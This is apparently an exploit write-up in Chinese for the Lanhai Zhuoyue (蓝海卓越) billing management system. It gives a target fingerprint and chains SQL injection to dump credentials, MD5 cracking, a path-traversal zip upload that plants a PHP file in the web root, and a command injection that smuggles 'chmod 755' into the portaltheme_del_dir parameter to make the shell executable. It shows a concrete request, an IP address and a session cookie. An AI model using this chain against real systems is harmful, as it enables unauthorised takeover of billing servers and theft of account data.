# 蓝海卓越计费管理系统多漏洞导致getshell

- **系统**：蓝海卓越计费管理系统多　|　**类型**：其他　|　**CVE**：—
- **指纹**：`title=="蓝海卓越计费管理系统"`
- **请求**：`GET /ajax_check.php?portaltheme_del_id=4&portaltheme_del_dir=%2Fmnt%2Fmysql%2Fusr%2Flocal%2Fportal%2Fthemes%2F20210519093903_738%2Fchmod+755+/usr/local/usr-gui/test.php HTTP/1.1`

**请求体 / payload**
```
/ajax/loaduser.php?UserName=1
通过注入跑出账号密码\

使用MD5解密出密码后登录系统\

点击PORTAL模板下面的PORTAL模板管理，选择上传模板\

\[root.zip]\(公众号：渗透安全HackTwo>\
由于新版本系统的模板位置不在web路径下，所以需要穿越模板路径\
Web绝对路径：
/usr/local/usr-gui/
模板路径：
/mnt/mysql/usr/local/portal/themes/20240519093115_xxx/
制作一个如下的压缩包：\

test.php内容为：字符编码必须为Unix(LF)
#!/bin/php
<?php
phpinfo();
?>
上传zip压缩包\

Shell位置为：
/test.php
但是访问时会提示：\

接下来就需要使用后台命令执行漏洞进行权限赋予：
Host:
X-Requested-With: XMLHttpRequest
Referer: http://124.114.151.106:8880/portaltheme_list.php
Cookie: mylang=zh_s; PHPSESSID=lp91fvnja6f987dj7jmkjh5601

之后再次访问
/test.php
```

**其他**
- 蓝海卓越计费管理系统多漏洞导致getshell: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 蓝海卓越 计费管理系统